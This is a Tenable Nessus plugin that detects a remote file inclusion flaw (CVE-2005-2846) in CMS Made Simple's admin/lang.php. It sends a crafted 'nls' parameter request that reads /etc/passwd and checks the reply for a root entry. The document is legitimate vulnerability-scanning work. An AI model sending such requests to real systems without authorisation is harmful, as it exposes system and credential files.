#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(19551);
  script_version ("$Revision: 1.20 $");
  script_cvs_date("$Date: 2012/10/30 01:30:41 $");

  script_cve_id("CVE-2005-2846");
  script_bugtraq_id(14709);
  script_osvdb_id(19113);

  script_name(english:"CMS Made Simple admin/lang.php nls Parameter Remote File Inclusion");
  script_summary(english:"Checks for nls parameter file include vulnerability in CMS Made Simple");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is vulnerable to
remote file include attacks." );
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running CMS Made Simple, a content
management system written in PHP. 

The version of CMS Made Simple installed on the remote host fails to
properly sanitize user-supplied input to the 'nls' parameter of the
'admin/lang.php' script before using it to include PHP code.  By
leveraging this flaw, an attacker may be able to view arbitrary files
on the remote host and execute arbitrary PHP code, possibly taken from
third-party hosts." );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/409654" );
  script_set_attribute(attribute:"see_also", value:"http://forum.cmsmadesimple.org/index.php/topic,1554.0.html" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to CMS Made Simple 0.10.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/01");
  script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/31");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cmsmadesimple:cms_made_simple");
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2012 Tenable Network Security, Inc.");
 
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, php: 1);

init_cookiejar();

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/cms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a couple of files.
  set_http_cookie(name: 'cms_language', value: SCRIPT_NAME);
  r = http_send_recv3(method: 'GET', port: port, exit_on_fail: 1,
    item: strcat(dir, "/admin/lang.php?", 
      "CMS_ADMIN_PAGE=1&",
      # nb: password file
      "nls[file][", SCRIPT_NAME, "][1]=/etc/passwd&",
      # GPL COPYING file, located in the main distribution directory.
      "nls[file][", SCRIPT_NAME, "][2]=../COPYING"
    ) );

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string: r[2], pattern:"root:.*:0:[01]:") ||
    # there's mention of the GPL
    "GNU GENERAL PUBLIC LICENSE" >< r[2]
  ) {
    security_warning(port);
    exit(0);
  }
}
